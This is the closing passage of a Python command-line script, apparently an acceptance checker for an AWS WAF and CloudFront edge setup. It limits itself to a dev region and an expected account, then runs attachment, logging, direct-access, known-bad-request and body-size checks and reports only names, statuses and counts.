        edge_acl_arn=published_parameter(
            session.client("ssm", region_name=_EDGE_REGION), environment, "edgeWebAclArn"
        ),
        pool_arn=f"arn:aws:cognito-idp:{region}:{account}:userpool/{pool_id}",
        environment=environment,
        access_log_group=access_arn.split(":log-group:", 1)[1].removesuffix(":*"),
    )


def _parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--profile", required=True)
    parser.add_argument("--environment", required=True)
    parser.add_argument("--region", required=True)
    parser.add_argument("--expected-account", required=True)
    parser.add_argument("--expect-mode", required=True, choices=("count", "block"))
    parser.add_argument("--count-since", help="ISO-8601 instant; report WAF matches since then")
    parser.add_argument(
        "--body-limits",
        action="store_true",
        help=(
            "run the ADR-078 body-size exclusion items b, c, a′, d and e (item a is "
            "ship_prompts.py --probe-marker); needs ADL_REFRESH and ADL_CSRF"
        ),
    )
    parser.add_argument(
        "--body-limit-item",
        action="append",
        choices=_BODY_LIMIT_ITEMS,
        help="with --body-limits, run only these items (repeatable); default every item",
    )
    return parser


def main(argv: Sequence[str] | None = None) -> int:
    """Run every check and print only names, statuses, rule names, and counts."""
    args = _parser().parse_args(argv)
    if args.environment != "dev" or args.region != _REGION:
        print("edge acceptance accepts only the approved dev region")
        return 2
    checks = _Checks()
    try:
        session = boto3.Session(profile_name=args.profile, region_name=args.region)
        if session.client("sts").get_caller_identity().get("Account") != args.expected_account:
            print("explicit profile did not resolve to the expected account")
            return 1
        target = _target(session, args.environment, args.region)
        start_ms = int(time.time() * 1000) - 60_000
        _attachment_and_modes(checks, session, target, args.expect_mode)
        _cloudfront_logging(checks, session, target)
        _edge_path(checks, target)
        _direct(checks, session, target, start_ms)
        _known_bad(checks, session, target, args.expect_mode, start_ms)
        if args.body_limits:
            _body_limits(
                _BodyLimitProbe(
                    checks,
                    session,
                    target,
                    start_ms,
                    _FreshCookies(lambda: _operator_cookies(target.origin)),
                ),
                frozenset(args.body_limit_item or _BODY_LIMIT_ITEMS),
            )
        if args.count_since:
            _count_evidence(
                checks, session, target, datetime.fromisoformat(args.count_since).astimezone(UTC)
            )
    except Exception as error:
        print(json.dumps({"stage": "edge-acceptance", "error_class": type(error).__name__}))
        return 1
    print(json.dumps({"checks": checks.checks, "passed": checks.passed}, sort_keys=True))
    return 0 if checks.passed else 1


if __name__ == "__main__":
    sys.exit(main())
